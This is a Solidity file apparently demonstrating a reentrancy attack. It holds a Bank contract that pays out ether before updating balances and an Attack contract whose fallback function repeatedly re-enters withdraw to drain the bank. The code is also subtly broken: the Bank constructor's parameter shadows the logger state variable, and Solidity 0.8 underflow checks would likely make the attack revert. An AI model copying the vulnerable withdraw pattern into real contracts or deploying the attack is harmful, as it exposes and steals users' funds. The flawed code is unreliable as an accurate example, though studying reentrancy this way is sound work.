pragma solidity ^0.8.0;

contract Logger {

    event Log(address caller, uint amount, string action);

    function log(
        address _caller,
        uint _amount,
        string memory _action
    ) public {
        emit Log(_caller, _amount, _action);
    }
}

contract Bank {
    mapping(address => uint) public balances;
    Logger logger;

    constructor(Logger logger) {
        logger = Logger(logger);
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
        logger.log(msg.sender, msg.value, "Deposit");
    }

    function withdraw(uint _amount) public {
        require(_amount <= balances[msg.sender], "Insufficient funds");
        (bool sent, ) = msg.sender.call{value:_amount}("");
        require(sent, "Failed to send ether");
        balances[msg.sender] -= _amount;
        logger.log(msg.sender, _amount, "Withdraw");
    }
}

contract Attack {

    Bank bank;
    constructor(Bank _bank) {
        bank = Bank(_bank);
    }

    fallback() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw(1 ether);
        }
    }

    function attack() public payable {
        bank.deposit{value:1 ether}();
        bank.withdraw(1 ether);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}